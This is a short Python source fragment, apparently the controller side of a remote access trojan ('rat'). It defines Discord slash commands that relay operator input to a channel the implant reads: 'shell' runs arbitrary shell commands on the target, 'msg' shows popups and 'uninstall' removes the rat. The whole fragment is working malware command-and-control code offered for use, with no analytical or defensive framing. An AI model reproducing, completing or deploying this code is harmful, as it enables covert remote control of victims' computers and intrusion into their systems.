@tree.command(name="shell", description="run shell command on target")
@app_commands.describe(cmd="command to run")
async def _shell(i: discord.Interaction, cmd: str):
    await _relay(i, f"shell {cmd}")

@tree.command(name="msg", description="popup message on target")
@app_commands.describe(text="popup text")
async def _msg(i: discord.Interaction, text: str):
    await _relay(i, f"msg {text}")

@tree.command(name="uninstall", description="remove rat from target")
async def _uninstall(i: discord.Interaction):
    await _relay(i, "uninstall")

async def _relay(i: discord.Interaction, payload: str):
    ch = client.get_channel(CHANNEL_ID)
    if ch is None:
        await i.response.send_message("channel not found", ephemeral=True)
        return
    await ch.send(payload)  # rat reads this plain message
    await i.response.send_message(f"sent: `{payload}`", ephemeral=True)

client.run(TOKEN)
